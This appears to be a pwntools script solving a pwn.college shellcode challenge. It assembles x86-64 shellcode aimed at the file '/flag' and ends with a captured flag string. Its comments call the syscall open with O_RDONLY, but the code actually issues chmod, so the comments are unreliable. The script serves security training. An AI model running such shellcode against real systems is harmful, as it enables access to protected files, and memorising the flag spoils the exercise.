from pwn import *
# io = process('./babyshell_level')

context.arch = 'amd64'

sc = asm('''
    ; //open("/flag", O_RDONLY, 0)
    mov rax, 0x5a              ; //syscall number for open
    lea rdi, [rip + path]     ; //address of the string "/flag"
    xor esi, esi              ; //O_RDONLY = 0
    mov esi, 0x4
    xor edx, edx              ; //mode (not needed for O_RDONLY)
    syscall                   ; //make the syscall

	path:
	.string "/flag"

	''')


# gdb.debug_shellcode(sc)
print(disasm(sc))
print(len(sc))

# elf = ELF.from_bytes(sc)

# elf.write(elf.entrypoint, sc)

# # Save as an ELF binary
# elf.save('shellcode_executable')

'''
pwn.college{Qoix-DRvegnUN6ssFqHjOHY_MeH.QXzIjMsETM5kzW}
'''